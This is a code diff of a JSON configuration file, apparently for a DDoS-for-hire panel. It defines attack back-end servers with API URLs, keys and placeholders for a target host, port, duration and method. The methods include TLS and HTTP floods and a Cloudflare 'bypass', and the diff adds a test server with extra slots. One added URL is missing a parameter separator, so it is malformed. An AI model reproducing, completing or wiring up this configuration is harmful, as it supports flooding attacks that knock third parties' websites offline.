@@ -1,18 +1,32 @@
 {
     "encL7": {
         "name": "L7 Server One",
-        "type": "Layer7",
+        "type": "Layer4",
         "slots": 5,
-        "url": "http://connect-proxy.xyz:1111/api/start?username=monitor&key=monitor&host=$host&port=$port&time=$time&method=$method&pps=-1&threads=$threads",
+        "url": "http://10.0.0.111:8080/api/start?user=FileGone&key=House-API-4JAWkQ$host&port=$port&time=$time&method=$method",
         "methods": {
             "TLS": "tls",
             "KILL": "http",
             "CF": "bypass"
         }
     },
+    "test": {
+        "name": "test 232",
+        "type": "Layer7",
+        "slots": 20,
+        "url": "http://10.0.0.111:8080/api/start?user=FileGone&key=House-API-4JAWkQ$host&port=$port&time=$time&method=$method",
+        "methods": {
+            "TLS": "tls",
+            "KILL": "http",
+            "CF": "bypass",
+            "test2": "tls",
+            "test22": "http",
+            "test222": "bypass"
+        }
+    },
     "WeedyL7": {
         "name": "L7 Server Two",
-        "type": "Layer7",
+        "type": "Layer7", 
         "slots": 10,
         "url": "https://darknetworksapi.xyz/api/attack?username=monitor&key=11361Mm&host=$host&port=$port&time=$time&method=$method",
         "methods": {
